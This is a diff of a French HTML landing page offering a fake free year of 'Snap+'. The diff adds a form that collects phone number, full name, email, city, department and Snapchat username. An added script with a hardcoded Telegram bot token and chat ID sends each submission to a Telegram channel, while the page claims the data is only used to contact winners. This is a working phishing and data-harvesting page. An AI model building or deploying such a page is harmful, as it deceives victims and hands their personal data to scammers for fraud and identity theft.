@@ -1,107 +1,196 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Snap+ Gratuit</title>
+  <meta charset="UTF-8" />
+  <title>🎁 Snap+ 1 An Gratuit</title>
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-color: #1a0033;
-      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1a0033, #2c014d);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       color: white;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
-
     .container {
-      background-color: #2c014d;
-      padding: 30px 20px;
+      background: rgba(44, 1, 77, 0.85);
+      border: 2px solid #a54ffb;
       border-radius: 20px;
+      padding: 30px 25px;
       text-align: center;
-      width: 300px;
+      width: 340px;
+      box-shadow: 0 0 20px #a54ffb;
+      position: relative;
+      animation: pulseBorder 2s infinite;
     }
-
+    @keyframes pulseBorder {
+      0% {
+        box-shadow: 0 0 10px #a54ffb;
+      }
+      50% {
+        box-shadow: 0 0 25px #a54ffb;
+      }
+      100% {
+        box-shadow: 0 0 10px #a54ffb;
+      }
+    }
     .logo {
-      font-size: 60px;
-      color: #ffffff;
-      margin-bottom: 10px;
+      font-size: 70px;
+      margin-bottom: 5px;
+      text-shadow: 0 0 10px #fff;
     }
-
     h1 {
-      font-size: 28px;
+      font-size: 24px;
       margin: 0;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+      color: #ffffff;
     }
-
     p {
-      margin: 10px 0 20px;
-      font-size: 16px;
+      font-size: 15px;
+      color: #ddd;
+      margin-bottom: 25px;
     }
-
-    .input-group {
-      display: flex;
-      align-items: center;
-      background-color: #3e025f;
-      padding: 10px;
-      border-radius: 10px;
-      margin-bottom: 20px;
-    }
-
-    .input-group img {
-      width: 24px;
-      margin-right: 10px;
-    }
-
-    .input-group span {
-      color: #ccc;
-      margin-right: 5px;
-    }
-
     input {
-      border: none;
-      background: none;
-      outline: none;
-      color: white;
-      font-size: 16px;
-      flex: 1;
-    }
-
-    button {
-      background-color: #a54ffb;
-      color: white;
-      border: none;
-      padding: 12px 30px;
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 2px solid #a54ffb;
       border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
+      background-color: transparent;
+      color: white;
+      font-size: 15px;
+      outline: none;
     }
-
-    .bottom-text {
-      margin-top: 20px;
-      font-size: 13px;
+    input::placeholder {
       color: #ccc;
+    }
+    button {
+      width: 100%;
+      background: #a54ffb;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+      box-shadow: 0 0 10px #a54ffb;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #8b3ddb;
+      box-shadow: 0 0 20px #c177ff;
+    }
+    .notice {
+      font-size: 12px;
+      margin-top: 15px;
+      color: #bbb;
+    }
+    #step2 {
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="logo">👻+</div>
-    <h1>Snap+</h1>
-    <p>Active Snap+ gratuitement<br>pendant 1 an</p>
+    <div class="logo">👻✨</div>
+    <h1>Snap+ Gratuit</h1>
+    <p>Active 1 an de Snap+ gratuitement</p>
 
-    <div class="input-group">
-      <img src="https://flagcdn.com/fr.svg" alt="FR" />
-      <span>+33</span>
-      <input type="text" placeholder="Numéro de téléphone">
-    </div>
+    <form id="giveawayForm">
+      <!-- Étape 1 : numéro de téléphone -->
+      <div id="step1">
+        <input
+          type="text"
+          name="telephone"
+          placeholder="Numéro de téléphone"
+          required
+          pattern="[\d\s+]{6,}"
+          title="Entrez un numéro valide"
+        />
+        <button type="button" onclick="showStep2()">Continuer</button>
+      </div>
 
-    <button>Continuer</button>
+      <!-- Étape 2 : autres infos -->
+      <div id="step2">
+        <input type="text" name="nom" placeholder="Nom" required />
+        <input type="text" name="prenom" placeholder="Prénom" required />
+        <input type="email" name="email" placeholder="Email" required />
+        <input type="text" name="ville" placeholder="Ville" required />
+        <input type="text" name="departement" placeholder="Département" required />
+        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
+        <button type="submit">Valider</button>
+      </div>
+    </form>
 
-    <div class="bottom-text">
-    
+    <div class="notice">
+      Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
+      n’est pas affilié à Snapchat.
     </div>
   </div>
+
+  <script>
+    const TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+    const CHAT_ID = "-1002810249796";
+
+    function showStep2() {
+      const phoneInput = document.querySelector('[name="telephone"]');
+      if (!phoneInput.value.trim()) {
+        alert("Veuillez entrer votre numéro de téléphone.");
+        return;
+      }
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+    }
+
+    document.getElementById("giveawayForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const data = new FormData(this);
+
+      const message = `
+━━━━━━━━━━━━━━━━━━━━━━━
+🎁 *NOUVELLE PARTICIPATION SNAP+* 🎁
+━━━━━━━━━━━━━━━━━━━━━━━
+
+📞 *Téléphone* : \`${data.get("telephone")}\`
+👤 *Nom* : \`${data.get("nom")}\`
+👤 *Prénom* : \`${data.get("prenom")}\`
+📧 *Email* : \`${data.get("email")}\`
+🏙️ *Ville* : \`${data.get("ville")}\`
+📍 *Département* : \`${data.get("departement")}\`
+👻 *Snapchat* : \`${data.get("snap")}\`
+
+━━━━━━━━━━━━━━━━━━━━━━━
+🕓 _Reçu le ${new Date().toLocaleString("fr-FR")}_
+━━━━━━━━━━━━━━━━━━━━━━━
+`;
+
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      })
+        .then((res) => res.json())
+        .then(() => {
+          alert("Merci ! Une personne vous contactera bientôt.");
+          this.reset();
+          document.getElementById("step1").style.display = "block";
+          document.getElementById("step2").style.display = "none";
+        })
+        .catch((err) => {
+          alert("Erreur lors de l’envoi. Réessayez.");
+          console.error(err);
+        });
+    });
+  </script>
 </body>
 </html>
